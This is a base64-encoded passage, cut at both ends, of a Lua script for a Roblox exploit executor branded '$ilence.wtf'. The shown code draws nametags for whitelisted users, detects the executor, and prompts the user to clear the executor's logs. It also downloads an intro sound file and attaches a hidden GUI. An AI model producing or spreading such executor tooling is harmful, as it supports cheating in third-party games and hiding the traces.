aGl0ZWxpc3RUYWdNYXAgPSB7fQogICAgbG9jYWwgdGFnU2V0dGluZ1doaXRlbGlzdE1lc3NhZ2UKCiAgICBsb2NhbCBmdW5jdGlvbiBpbml0aWFsaXplV0woKQogICAgICAgIFdoaXRlbGlzdE1lc3NhZ2VzID0gewogICAgICAgICAgICB0YWdTZXR0aW5nV2hpdGVsaXN0TWVzc2FnZSBvciBkZWZhdWx0V2hpdGVsaXN0TWVzc2FnZXNbMV0sCiAgICAgICAgICAgICIkaWxlbmNlLld0ZiBQcmVtaXVtIE9uIFRvcCgpIgogICAgICAgIH0KCiAgICAgICAgV2hpdGVsaXN0VGFnTWFwID0gewogICAgICAgICAgICBbbW9kaWZ5U3RyaW5nKHRhZ1NldHRpbmdXaGl0ZWxpc3RNZXNzYWdlIG9yICIkaWxlbmNlLld0ZiBPbiBUb3AoKSIpXSA9ICIkaWxlbmNlLnd0ZiBVc2VyIiwKICAgICAgICAgICAgW21vZGlmeVN0cmluZygiJGlsZW5jZS5XdGYgUHJlbWl1bSBPbiBUb3AoKSIpXSA9ICIkaWxlbmNlLlByZW1pdW0gVXNlciIKICAgICAgICB9CiAgICBlbmQKCiAgICBpbml0aWFsaXplV0woKQoKICAgIGxvY2FsIERFRkFVTFRfUkFOS19OQU1FID0gIiRpbGVuY2Uud3RmIFVzZXIiCgogICAgbG9jYWwgVXNlcm5hbWVSYW5rTWFwID0gewogICAgICAgIFsiMDF4TVlTIl0gPSAiJGlsZW5jZS5XdGYgT3duZXIiLAogICAgICAgIFsiU3RyaXh4c3kiXSA9ICIkaWxlbmNlLld0ZiBPd25lciIsCiAgICAgICAgWyJjaHVsb21laWkiXSA9ICIkaWxlbmNlLnd0ZiBRdWVlbiIsCiAgICAgICAgWyJlMmVkZXEiXSA9ICIkaWxlbmNlLld0ZiBcbkNvIE93bmVyIiwKCQlbImp0eXJqZXRhaHRlcnNqcnQiXSA9ICIkaWxlbmNlLld0ZiBcbkNvIE93bmVyIiwKICAgICAgICBbIkplbWVuemJveTEwOTAiXSA9ICJOZWJ1bGEg4piE77iPIiwKICAgIH0KCiAgICBsb2NhbCBSYW5rQ29sb3JzID0gewogICAgICAgIFsiJGlsZW5jZS53dGYgVXNlciJdID0gewogICAgICAgICAgICBwcmltYXJ5ID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCksCiAgICAgICAgICAgIGFjY2VudCA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpLAogICAgICAgICAgICB0ZXh0Q29sb3IgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQogICAgICAgIH0sCiAgICAgICAgWyIkaWxlbmNlLlByZW1pdW0gVXNlciJdID0gewogICAgICAgICAgICBwcmltYXJ5ID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCksCiAgICAgICAgICAgIGFjY2VudCA9IENvbG9yMy5mcm9tUkdCKDE4OSwgMjMyLCAyNDIpLAogICAgICAgICAgICB0ZXh0Q29sb3IgPSBDb2xvcjMuZnJvbVJHQig0OSwgMTY5LCAxNzMpCiAgICAgICAgfSwKICAgICAgICBbIiRpbGVuY2UuV3RmIE93bmVyIl0gPSB7CiAgICAgICAgICAgIHByaW1hcnkgPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKSwKICAgICAgICAgICAgYWNjZW50ID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSksCiAgICAgICAgICAgIHRleHRDb2xvciA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMCwgMCkKICAgICAgICB9LAogICAgICAgIFsiJGlsZW5jZS53dGYgUXVlZW4iXSA9IHsKICAgICAgICAgICAgcHJpbWFyeSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApLAogICAgICAgICAgICBhY2NlbnQgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KSwKICAgICAgICAgICAgdGV4dENvbG9yID0gQ29sb3IzLmZyb21SR0IoMjUyLCAxOTQsIDI1NSkKICAgICAgICB9LAogICAgICAgIFsiJGlsZW5jZS5XdGYgXG5DbyBPd25lciJdID0gewogICAgICAgICAgICBwcmltYXJ5ID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCksCiAgICAgICAgICAgIGFjY2VudCA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpLAogICAgICAgICAgICB0ZXh0Q29sb3IgPSBDb2xvcjMuZnJvbVJHQigxNTUsIDE2MSwgMikKICAgICAgICB9LAogICAgICAgIFsiTmVidWxhIOKYhO+4jyJdID0gewogICAgICAgICAgICBwcmltYXJ5ID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCksCiAgICAgICAgICAgIGFjY2VudCA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpLAogICAgICAgICAgICB0ZXh0Q29sb3IgPSBDb2xvcjMuZnJvbVJHQig4MiwgNDQsIDE1MykKICAgICAgICB9LAogICAgICAgIFsiJGlsZW5jZS5XdGYgTW9kIl0gPSB7CiAgICAgICAgICAgIHByaW1hcnkgPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKSwKICAgICAgICAgICAgYWNjZW50ID0gQ29sb3IzLmZyb21SR0IoMTIwLCAxNDAsIDI1NSksCiAgICAgICAgICAgIHRleHRDb2xvciA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgfSwKICAgICAgICBbIiRpbGVuY2UuV3RmIEhlbHBlciJdID0gewogICAgICAgICAgICBwcmltYXJ5ID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCksCiAgICAgICAgICAgIGFjY2VudCA9IENvbG9yMy5mcm9tUkdCKDE5MiwgMjA5LCAxMDcpLAogICAgICAgICAgICB0ZXh0Q29sb3IgPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKQogICAgICAgIH0KICAgIH0KCiAgICBsb2NhbCBDT05GSUcgPSB7CiAgICAgICAgVEFHX1NJWkUgPSBVRGltMi5uZXcoMCwgMTIwLCAwLCA0MCksCiAgICAgICAgVEFHX09GRlNFVCA9IFZlY3RvcjMubmV3KDAsIDIuNCwgMCksCiAgICAgICAgTUFYX0RJU1RBTkNFID0gNjUKICAgIH0KCiAgICBsb2NhbCBDaGF0V2hpdGVsaXN0ID0ge30KICAgIGxvY2FsIHBsYXllclRhZ3MgPSB7fQoKICAgIGxvY2FsIGFwaSA9IHt9CgogICAgZnVuY3Rpb24gYXBpLmluaXRpYWxpemVXaGl0ZWxpc3QoKQogICAgICAgIGluaXRpYWxpemVXTCgpCiAgICBlbmQKCiAgICBmdW5jdGlvbiBhcGkuV2hpdGVsaXN0TWVzc2FnZShuZXdNZXNzYWdlKQogICAgICAgIGlmIG5ld01lc3NhZ2UgdGhlbgogICAgICAgICAgICB0YWdTZXR0aW5nV2hpdGVsaXN0TWVzc2FnZSA9IG5ld01lc3NhZ2UKICAgICAgICBlbmQKICAgICAgICBpbml0aWFsaXplV0woKQogICAgZW5kCgogICAgZnVuY3Rpb24gYXBpLldoaXRlbGlzdFJvbGVNYXAobmV3TWFwKQogICAgICAgIGlmIG5ld01hcCB0aGVuCiAgICAgICAgICAgIFVzZXJuYW1lUmFua01hcCA9IG5ld01hcAogICAgICAgIGVuZAogICAgZW5kCgogICAgZnVuY3Rpb24gYXBpLldoaXRlbGlzdFJvbGVDb2xvcnMobmV3Q29sb3JzKQogICAgICAgIGlmIG5ld0NvbG9ycyB0aGVuCiAgICAgICAgICAgIFJhbmtDb2xvcnMgPSBuZXdDb2xvcnMKICAgICAgICBlbmQKICAgIGVuZAoKICAgIGZ1bmN0aW9uIGFwaS5Db25maWdzKG5ld0NvbmZpZykKICAgICAgICBpZiBuZXdDb25maWcgdGhlbgogICAgICAgICAgICBDT05GSUcgPSBuZXdDb25maWcKICAgICAgICBlbmQKICAgIGVuZAoKICAgIGZ1bmN0aW9uIGFwaS5VcGRhdGVEZWZhdWx0UmFua05hbWUobmV3RGVmYXVsdCkKICAgICAgICBpZiBuZXdEZWZhdWx0IHRoZW4KICAgICAgICAgICAgREVGQVVMVF9SQU5LX05BTUUgPSBuZXdEZWZhdWx0CiAgICAgICAgZW5kCiAgICBlbmQKCiAgICBsb2NhbCBmdW5jdGlvbiBhdHRhY2hUYWdUb0hlYWQoY2hhcmFjdGVyLCBwbGF5ZXIsIHJhbmtUZXh0KQogICAgICAgIGxvY2FsIGhlYWQgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkhlYWQiKQogICAgICAgIGlmIG5vdCBoZWFkIHRoZW4gcmV0dXJuIGVuZAoKICAgICAgICBpZiBoZWFkOkZpbmRGaXJzdENoaWxkKCJSYW5rVGFnIikgdGhlbgogICAgICAgICAgICBoZWFkLlJhbmtUYWc6RGVzdHJveSgpCiAgICAgICAgZW5kCgogICAgICAgIGlmIHBsYXllciA9PSBMb2NhbFBsYXllciBhbmQgbm90IHNob3dPd25UYWcgdGhlbgogICAgICAgICAgICByZXR1cm4KICAgICAgICBlbmQKCiAgICAgICAgbG9jYWwgY29sb3JzID0gUmFua0NvbG9yc1tyYW5rVGV4dF0KICAgICAgICBpZiBub3QgY29sb3JzIHRoZW4KICAgICAgICAgICAgd2FybigiW1JhbmtUYWddIEludmFsaWQgcmFua1RleHQ6ICIgLi4gdG9zdHJpbmcocmFua1RleHQpKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBlbmQKCiAgICAgICAgbG9jYWwgdGFnID0gSW5zdGFuY2UubmV3KCJCaWxsYm9hcmRHdWkiKQogICAgICAgIHRhZy5BZG9ybmVlID0gaGVhZAogICAgICAgIHRhZy5OYW1lID0gIlJhbmtUYWciCiAgICAgICAgdGFnLlNpemUgPSBDT05GSUcuVEFHX1NJWkUKICAgICAgICB0YWcuU3R1ZHNPZmZzZXQgPSBDT05GSUcuVEFHX09GRlNFVAogICAgICAgIHRhZy5BbHdheXNPblRvcCA9IHRydWUKICAgICAgICB0YWcuTWF4RGlzdGFuY2UgPSBDT05GSUcuTUFYX0RJU1RBTkNFCiAgICAgICAgdGFnLlBhcmVudCA9IFRhZ1BhcmVudAoKICAgICAgICBsb2NhbCBjb250YWluZXIgPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQogICAgICAgIGNvbnRhaW5lci5TaXplID0gVURpbTIubmV3KDEsIDAsIDEsIDApCiAgICAgICAgY29udGFpbmVyLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAwLjIKICAgICAgICBjb250YWluZXIuQmFja2dyb3VuZENvbG9yMyA9IGNvbG9ycy5wcmltYXJ5CiAgICAgICAgY29udGFpbmVyLkJvcmRlclNpemVQaXhlbCA9IDAKICAgICAgICBjb250YWluZXIuVGV4dCA9ICIiCiAgICAgICAgY29udGFpbmVyLkNsaXBzRGVzY2VuZGFudHMgPSB0cnVlCiAgICAgICAgY29udGFpbmVyLlBhcmVudCA9IHRhZwoKICAgICAgICBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgY29udGFpbmVyKS5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCA2KQoKCQlsb2NhbCBsYWJlbCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKCQlsYWJlbC5TaXplID0gVURpbTIubmV3KDEsIDAsIDAuNiwgMCkKCQlsYWJlbC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCAwLCAwLjEsIDApCgkJbGFiZWwuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKCQlsYWJlbC5UZXh0ID0gcmFua1RleHQKCQlsYWJlbC5UZXh0Q29sb3IzID0gY29sb3JzLnRleHRDb2xvciBvciBDb2xvcjMubmV3KDEsIDEsIDEpCgkJbGFiZWwuVGV4dFNpemUgPSAxNwoJCWxhYmVsLkZvbnQgPSBFbnVtLkZvbnQuU291cmNlU2Fuc0JvbGQKCQlsYWJlbC5QYXJlbnQgPSBjb250YWluZXIKCiAgICAgICAgbG9jYWwgdXNlckxhYmVsID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQogICAgICAgIHVzZXJMYWJlbC5TaXplID0gVURpbTIubmV3KDEsIDAsIDAuNCwgMCkKICAgICAgICB1c2VyTGFiZWwuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMCwgMC42LCAwKQogICAgICAgIHVzZXJMYWJlbC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgICAgIHVzZXJMYWJlbC5UZXh0ID0gIkAiIC4uIHBsYXllci5OYW1lCiAgICAgICAgdXNlckxhYmVsLlRleHRDb2xvcjMgPSBjb2xvcnMuYWNjZW50CiAgICAgICAgdXNlckxhYmVsLlRleHRTaXplID0gMTAKICAgICAgICB1c2VyTGFiZWwuRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICAgICAgdXNlckxhYmVsLlBhcmVudCA9IGNvbnRhaW5lcgoKICAgICAgICBwbGF5ZXJUYWdzW3BsYXllcl0gPSB0YWcKICAgIGVuZAoKICAgIGxvY2FsIGZ1bmN0aW9uIHJlbW92ZVRhZyhwbGF5ZXIpCiAgICAgICAgaWYgcGxheWVyVGFnc1twbGF5ZXJdIHRoZW4KICAgICAgICAgICAgcGxheWVyVGFnc1twbGF5ZXJdOkRlc3Ryb3koKQogICAgICAgICAgICBwbGF5ZXJUYWdzW3BsYXllcl0gPSBuaWwKICAgICAgICBlbmQKICAgIGVuZAoKICAgIGxvY2FsIGZ1bmN0aW9uIGNyZWF0ZVRhZyhwbGF5ZXIsIHJhbmtUZXh0KQogICAgICAgIGlmIHBsYXllclRhZ3NbcGxheWVyXSB0aGVuIHJldHVybiBlbmQKCiAgICAgICAgaWYgcGxheWVyLkNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgIGF0dGFjaFRhZ1RvSGVhZChwbGF5ZXIuQ2hhcmFjdGVyLCBwbGF5ZXIsIHJhbmtUZXh0KQogICAgICAgIGVuZAogICAgICAgIHBsYXllci5DaGFyYWN0ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKGNoYXJhY3RlcikKICAgICAgICAgICAgYXR0YWNoVGFnVG9IZWFkKGNoYXJhY3RlciwgcGxheWVyLCByYW5rVGV4dCkKICAgICAgICBlbmQpCiAgICBlbmQKCiAgICBsb2NhbCBmdW5jdGlvbiBzZXR1cENoYXRMaXN0ZW5lcihwbGF5ZXIpCiAgICAgICAgbG9jYWwgbmFtZUxvd2VyID0gcGxheWVyLk5hbWU6bG93ZXIoKQoKICAgICAgICBpZiBVc2VybmFtZVJhbmtNYXBbcGxheWVyLk5hbWVdIHRoZW4KICAgICAgICAgICAgbG9jYWwgcm9sZSA9IFVzZXJuYW1lUmFua01hcFtwbGF5ZXIuTmFtZV0KICAgICAgICAgICAgQ2hhdFdoaXRlbGlzdFtuYW1lTG93ZXJdID0gdHJ1ZQogICAgICAgICAgICBjcmVhdGVUYWcocGxheWVyLCByb2xlKQogICAgICAgICAgICB3YXJuKCJb4p2VJGlsZW5jZS5XdGYgTmFtZXRhZ3MgQXBpXTogV2hpdGVsaXN0ZWQgcGxheWVyIEAiIC4uIHBsYXllci5EaXNwbGF5TmFtZSAuLiAiIGpvaW5lZCEgfCBSb2xlOiAiIC4uIHJvbGUpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAoKICAgICAgICBwbGF5ZXIuQ2hhdHRlZDpDb25uZWN0KGZ1bmN0aW9uKG1zZykKICAgICAgICAgICAgbG9jYWwgY2xlYW5lZCA9IG1vZGlmeVN0cmluZyhtc2cpCiAgICAgICAgICAgIGxvY2FsIG1hdGNoZWRUYWcgPSBXaGl0ZWxpc3RUYWdNYXBbY2xlYW5lZF0KCiAgICAgICAgICAgIGlmIG1hdGNoZWRUYWcgYW5kIG5vdCBDaGF0V2hpdGVsaXN0W25hbWVMb3dlcl0gdGhlbgogICAgICAgICAgICAgICAgQ2hhdFdoaXRlbGlzdFtuYW1lTG93ZXJdID0gdHJ1ZQogICAgICAgICAgICAgICAgY3JlYXRlVGFnKHBsYXllciwgbWF0Y2hlZFRhZykKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCgogICAgLS0gQ29uc3RhbnRseSBjaGVjayBhbmQgcmVhcHBseSB0YWdzIGZvciBwbGF5ZXJzIGluIFVzZXJuYW1lUmFua01hcAogICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgd2hpbGUgdHJ1ZSBkbwogICAgICAgICAgICBmb3IgcGxheWVyTmFtZSwgcmFuayBpbiBwYWlycyhVc2VybmFtZVJhbmtNYXApIGRvCiAgICAgICAgICAgICAgICBsb2NhbCBwbGF5ZXIgPSBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKHBsYXllck5hbWUpCiAgICAgICAgICAgICAgICBpZiBwbGF5ZXIgdGhlbgogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBwbGF5ZXJUYWdzW3BsYXllcl0gdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBjcmVhdGVUYWcocGxheWVyLCByYW5rKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICB0YXNrLndhaXQoNSkgIC0tIENoZWNrIGV2ZXJ5IDUgc2Vjb25kcwogICAgICAgIGVuZAogICAgZW5kKQoKICAgIGZvciBfLCBwbGF5ZXIgaW4gaXBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICBzZXR1cENoYXRMaXN0ZW5lcihwbGF5ZXIpCiAgICAgICAgZW5kKQogICAgZW5kCgogICAgUGxheWVycy5QbGF5ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKHBsYXllcikKICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgc2V0dXBDaGF0TGlzdGVuZXIocGxheWVyKQogICAgICAgIGVuZCkKICAgIGVuZCkKCiAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKGNoYXJhY3RlcikKICAgICAgICBsb2NhbCBuYW1lTG93ZXIgPSBMb2NhbFBsYXllci5OYW1lOmxvd2VyKCkKICAgICAgICBpZiBzaG93T3duVGFnIGFuZCBDaGF0V2hpdGVsaXN0W25hbWVMb3dlcl0gdGhlbgogICAgICAgICAgICBsb2NhbCByb2xlID0gVXNlcm5hbWVSYW5rTWFwW0xvY2FsUGxheWVyLk5hbWVdIG9yIERFRkFVTFRfUkFOS19OQU1FCiAgICAgICAgICAgIGF0dGFjaFRhZ1RvSGVhZChjaGFyYWN0ZXIsIExvY2FsUGxheWVyLCByb2xlKQogICAgICAgIGVuZAogICAgZW5kKQoKICAgIGZ1bmN0aW9uIGFwaS50b2dnbGVPd25UYWcodmFsdWUpCiAgICAgICAgc2hvd093blRhZyA9IHZhbHVlCiAgICAgICAgaWYgTG9jYWxQbGF5ZXIgdGhlbgogICAgICAgICAgICBsb2NhbCBuYW1lTG93ZXIgPSBMb2NhbFBsYXllci5OYW1lOmxvd2VyKCkKICAgICAgICAgICAgaWYgc2hvd093blRhZyBhbmQgQ2hhdFdoaXRlbGlzdFtuYW1lTG93ZXJdIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIHJvbGUgPSBVc2VybmFtZVJhbmtNYXBbTG9jYWxQbGF5ZXIuTmFtZV0gb3IgREVGQVVMVF9SQU5LX05BTUUKICAgICAgICAgICAgICAgIGNyZWF0ZVRhZyhMb2NhbFBsYXllciwgcm9sZSkKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgcmVtb3ZlVGFnKExvY2FsUGxheWVyKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAoKICAgIGFwaS5Vc2VybmFtZVJhbmtNYXAgPSBVc2VybmFtZVJhbmtNYXAKICAgIGFwaS5SYW5rQ29sb3JzID0gUmFua0NvbG9ycwogICAgYXBpLkNPTkZJRyA9IENPTkZJRwoKICAgIHJldHVybiBhcGkKZW5kCgpsb2NhbCByYW5rVGFnZ2VyTW9kdWxlID0gU2lsZW5jZVdURnRhZ3MoKQoKLS0gTm93IGNhbiBjYWxsLCBmb3IgZXhhbXBsZToKLS0gcmFua1RhZ2dlck1vZHVsZS5XaGl0ZWxpc3RSb2xlTWFwKHsgWyJOZXdVc2VyIl0gPSAiVklQIiB9KQotLSByYW5rVGFnZ2VyTW9kdWxlLldoaXRlbGlzdFJvbGVDb2xvcnMoeyBbIlZJUCJdID0geyBwcmltYXJ5ID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyMTUsIDApLCBhY2NlbnQgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KSB9IH0pCi0tIHJhbmtUYWdnZXJNb2R1bGUudG9nZ2xlT3duVGFnKHRydWUpCgpyYW5rVGFnZ2VyTW9kdWxlLnRvZ2dsZU93blRhZyh0cnVlKQoKbG9jYWwgZnVuY3Rpb24gZ2V0RXhlY3V0b3JOYW1lKCkKICAgIGlmIGlkZW50aWZ5ZXhlY3V0b3IgdGhlbgogICAgICAgIGxvY2FsIHN1Y2Nlc3MsIG5hbWUgPSBwY2FsbChpZGVudGlmeWV4ZWN1dG9yKQogICAgICAgIGlmIHN1Y2Nlc3MgYW5kIHR5cGUobmFtZSkgPT0gInN0cmluZyIgdGhlbgogICAgICAgICAgICByZXR1cm4gbmFtZQogICAgICAgIGVuZAogICAgZW5kCiAgICByZXR1cm4gIlVua25vd24gRXhlY3V0b3IiCmVuZAoKbG9jYWwgZXhlY3V0b3JOYW1lID0gZ2V0RXhlY3V0b3JOYW1lKCkKCk5vdGlmaWNhdGlvbkxpYi5Ob3RpZnkoewogICAgVGl0bGUgPSAiQWN0aW9uIFJlcXVpcmVkISIsCiAgICBDb250ZW50ID0gIkRvIHlvdSB3YW50IHRvIGNsZWFyIHlvdXIgZXhlY3V0b3IgbG9ncyBDb25zb2xlPyIsCiAgICBCdXR0b24xID0gdHJ1ZSwKICAgIEJ1dHRvbjFUZXh0ID0gIlllcyIsCiAgICBCdXR0b24xQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgaWYgdHlwZShyY29uc29sZWNsZWFyKSA9PSAiZnVuY3Rpb24iIHRoZW4KICAgICAgICAgICAgcmNvbnNvbGVjbGVhcigpCiAgICAgICAgICAgIE5vdGlmaWNhdGlvbkxpYi5Ob3RpZnkoewogICAgICAgICAgICAgICAgVGl0bGUgPSAiQ29uc29sZSBDbGVhcmVkIiwKICAgICAgICAgICAgICAgIENvbnRlbnQgPSBleGVjdXRvck5hbWUgLi4gIiBMb2dzIENvbnNvbGUgd2FzIHN1Y2Nlc3NmdWxseSBjbGVhcmVkLiIsCiAgICAgICAgICAgICAgICBEdXJhdGlvbiA9IDYKICAgICAgICAgICAgfSkKICAgICAgICBlbHNlCiAgICAgICAgICAgIE5vdGlmaWNhdGlvbkxpYi5Ob3RpZnkoewogICAgICAgICAgICAgICAgVGl0bGUgPSAiVW5hYmxlIHRvIENsZWFyIENvbnNvbGUiLAogICAgICAgICAgICAgICAgQ29udGVudCA9ICJZb3VyIGV4ZWN1dG9yIGRvZXMgbm90IHN1cHBvcnQgY2xlYXJpbmcgdGhlIGNvbnNvbGUuIiwKICAgICAgICAgICAgICAgIER1cmF0aW9uID0gOAogICAgICAgICAgICB9KQogICAgICAgIGVuZAogICAgZW5kLAogICAgQnV0dG9uMiA9IHRydWUsCiAgICBCdXR0b24yVGV4dCA9ICJObyIsCiAgICBCdXR0b24yQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgTm90aWZpY2F0aW9uTGliLk5vdGlmeSh7CiAgICAgICAgICAgIFRpdGxlID0gIkFjdGlvbiBDYW5jZWxsZWQiLAogICAgICAgICAgICBDb250ZW50ID0gIkRldmVsb3BlciBDb25zb2xlIHdhcyBub3QgY2xlYXJlZC4iLAogICAgICAgICAgICBEdXJhdGlvbiA9IDQKICAgICAgICB9KQogICAgZW5kCn0pCgoKbG9jYWwgU291bmRTZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJTb3VuZFNlcnZpY2UiKQpsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKCmxvY2FsIGludHJvVXJsID0gImh0dHBzOi8vZ2l0aHViLmNvbS9ub3RteXMvbWFpbi9yYXcvcmVmcy9oZWFkcy9tYWluL2ludHJvL3V0b3BpYS52b3lhZ2UubXAzIgpsb2NhbCBpbnRyb0ZvbGRlciA9ICJzb3VuZHNfdXRvcGlhIgpsb2NhbCBpbnRyb0ZpbGVOYW1lID0gInV0b3BpYS52b3lhZ2UubXAzIiAgCmxvY2FsIGludHJvRmlsZVBhdGggPSBpbnRyb0ZvbGRlciAuLiAiLyIgLi4gaW50cm9GaWxlTmFtZQoKbG9jYWwgZnVuY3Rpb24gZmlsZUV4aXN0cyhwYXRoKQogICAgcmV0dXJuIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICByZWFkZmlsZShwYXRoKQogICAgZW5kKQplbmQKCmxvY2FsIGZ1bmN0aW9uIGVuc3VyZUZvbGRlcigpCiAgICBpZiBub3QgaXNmb2xkZXIoaW50cm9Gb2xkZXIpIHRoZW4KICAgICAgICBtYWtlZm9sZGVyKGludHJvRm9sZGVyKQogICAgZW5kCmVuZAoKbG9jYWwgZnVuY3Rpb24gZmV0Y2hBbmRTYXZlSW50cm8oKQogICAgZW5zdXJlRm9sZGVyKCkKICAgIGxvY2FsIHN1Y2Nlc3MsIGRhdGEgPSBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgcmV0dXJuIGdhbWU6SHR0cEdldChpbnRyb1VybCkKICAgIGVuZCkKCiAgICBpZiBzdWNjZXNzIGFuZCBkYXRhIHRoZW4KICAgICAgICB3cml0ZWZpbGUoaW50cm9GaWxlUGF0aCwgZGF0YSkKICAgICAgICByZXR1cm4gdHJ1ZQogICAgZWxzZQogICAgICAgIHdhcm4oIkZhaWxlZCB0byBmZXRjaCBpbnRybyBhdWRpbzogIiAuLiAoZGF0YSBvciAiVW5rbm93biBlcnJvciIpKQogICAgICAgIHJldHVybiBmYWxzZQogICAgZW5kCmVuZAoKbG9jYWwgZnVuY3Rpb24gcGxheUludHJvU291bmQoc2NyZWVuR3VpKQogICAgaWYgbm90IGZpbGVFeGlzdHMoaW50cm9GaWxlUGF0aCkgdGhlbgogICAgICAgIGxvY2FsIG9rID0gZmV0Y2hBbmRTYXZlSW50cm8oKQogICAgICAgIGlmIG5vdCBvayB0aGVuIHJldHVybiBlbmQKICAgIGVuZAoKICAgIGxvY2FsIHN1Y2Nlc3MsIGFzc2V0UGF0aCA9IHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICByZXR1cm4gZ2V0Y3VzdG9tYXNzZXQoaW50cm9GaWxlUGF0aCkKICAgIGVuZCkKCiAgICBpZiBub3Qgc3VjY2VzcyB0aGVuCiAgICAgICAgd2FybigiRmFpbGVkIHRvIGNyZWF0ZSBjdXN0b20gYXNzZXQgZnJvbSBwYXRoOiAiIC4uIGludHJvRmlsZVBhdGgpCiAgICAgICAgcmV0dXJuCiAgICBlbmQKCiAgICBsb2NhbCBzb3VuZCA9IEluc3RhbmNlLm5ldygiU291bmQiKQogICAgc291bmQuU291bmRJZCA9IGFzc2V0UGF0aAogICAgc291bmQuVm9sdW1lID0gMC41CiAgICBzb3VuZC5OYW1lID0gIkludHJvU291bmQiCiAgICBzb3VuZC5QYXJlbnQgPSBzY3JlZW5HdWkKCiAgICBsb2NhbCBvaywgZXJyID0gcGNhbGwoZnVuY3Rpb24oKQogICAgICAgIFNvdW5kU2VydmljZTpQbGF5TG9jYWxTb3VuZChzb3VuZCkKICAgIGVuZCkKCiAgICBpZiBub3Qgb2sgdGhlbgogICAgICAgIHdhcm4oIlNvdW5kIHBsYXliYWNrIGVycm9yOiAiIC4uIGVycikKICAgIGVuZAoKICAgIHNvdW5kLkVuZGVkOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgIHNvdW5kOkRlc3Ryb3koKQogICAgZW5kKQplbmQKCmxvY2FsIGZ1bmN0aW9uIGluaXRBbmRQbGF5KCkKICAgIGxvY2FsIHBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKICAgIGxvY2FsIHBsYXllckd1aSA9IHBsYXllcjpXYWl0Rm9yQ2hpbGQoIlBsYXllckd1aSIpCiAgICBsb2NhbCBndWkgPSBJbnN0YW5jZS5uZXcoIlNjcmVlbkd1aSIpCiAgICBndWkuTmFtZSA9ICJTb3VuZEd1aSIKICAgIGd1aS5QYXJlbnQgPSBwbGF5ZXJHdWkKCiAgICBwbGF5SW50cm9Tb3VuZChndWkpCmVuZAoKaW5pdEFuZFBsYXkoKQoKLS0gcGljayBDb3JlR3VpIC8gaGlkZGVuIFVJIGRlcGVuZGluZyBvbiBleGVjdXRvcgpsb2NhbCBjb3JlID0gKGdldGh1aSBhbmQgZ2V0aHVpKCkpIG9yIGdhbWU6R2V0U2VydmljZSgiQ29yZUd1aSIpCgpsb2NhbCBndWkgPSBJbnN0YW5jZS5uZXcoIlNjcmVlbkd1aSIpCmd1aS5OYW1lID0gIiRpbGVuY2Uud3RmIgpndWkuRGlzcGxheU9yZGVyID0gOTk5OTkKZ3VpLklnbm9yZUd1aUluc2V0ID0gdHJ1ZQpndWkuWkluZGV4QmVoYXZpb3IgPSBFbnVtLlpJbmRleEJlaGF2aW9yLlNpYmxpbmcKCi0